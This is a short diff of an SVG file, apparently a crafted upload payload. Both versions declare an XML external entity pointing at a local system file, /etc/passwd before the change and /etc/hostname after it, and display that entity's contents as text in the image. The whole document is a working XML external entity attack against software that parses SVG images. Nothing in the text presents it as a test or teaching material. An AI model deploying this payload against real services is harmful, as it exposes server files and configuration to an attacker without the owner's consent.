@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
-<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="800" viewBox="0 0 1200 800">
-  <rect width="1200" height="800" fill="black"/>
-  <text x="5" y="15" font-size="9" fill="lime" xml:space="preserve">&xxe;</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="120">
+  <rect width="800" height="120" fill="#111"/>
+  <text x="10" y="70" font-size="28" fill="#00ff00" font-family="monospace">&xxe;</text>
 </svg>
